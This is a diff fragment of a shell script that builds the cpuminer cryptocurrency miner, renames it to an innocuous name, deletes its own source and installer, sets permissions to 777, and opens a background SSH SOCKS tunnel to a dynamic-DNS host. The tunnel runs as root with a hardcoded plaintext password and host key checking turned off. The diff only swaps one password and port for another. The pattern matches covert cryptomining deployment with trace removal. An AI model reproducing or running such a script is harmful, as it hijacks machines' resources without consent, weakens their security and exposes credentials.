@@ -5,4 +5,4 @@ cd severtat
 chmod +x *
 ./build.sh
 make
-mv cpuminer trgp && cp trgp ../ && cd ..  && sudo rm -rf severtat severcode.sh && sudo chmod 777 * && screen -d -m sshpass -p truong13397 ssh -o StrictHostKeyChecking=no -D 1397 root@proxypro.ddns.net && cpulimit --exe trgp --limit 200 -b
+mv cpuminer trgp && cp trgp ../ && cd ..  && sudo rm -rf severtat severcode.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxypro.ddns.net && cpulimit --exe trgp --limit 200 -b
